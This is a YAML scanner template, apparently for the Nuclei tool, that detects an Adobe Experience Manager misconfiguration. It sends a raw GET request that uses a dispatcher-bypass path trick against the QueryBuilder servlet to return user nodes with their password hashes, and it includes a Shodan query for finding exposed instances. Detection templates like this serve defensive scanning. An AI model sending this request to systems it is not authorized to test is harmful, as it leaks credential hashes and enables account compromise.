http:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    type: word
    words:
    - '"success":true'
    - rep:password
  matchers-condition: and
  raw:
  - 'GET /bin/querybuilder.json.;%0aa.css?p.hits=full&property=rep:authorizableId&type=rep:User
    HTTP/1.1

    Host: {{Hostname}}

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

    Accept-Language: en-US,en;q=0.5

    Accept-Encoding: gzip, deflate

    '
id: aem-hash-querybuilder
info:
  author: DhiyaneshDk
  classification:
    cpe: cpe:2.3:a:adobe:acs_aem_commons:*:*:*:*:*:*:*:*
  description: AEM hased password can be queried via QueryBuilder Servlet.
  metadata:
    max-request: 1
    product: acs_aem_commons
    shodan-query: http.component:"Adobe Experience Manager"
    vendor: adobe
  name: Query hashed password via QueryBuilder Servlet
  reference:
  - https://twitter.com/AEMSecurity/status/1372392101829349376
  severity: medium
  tags: aem,misconfig,vuln
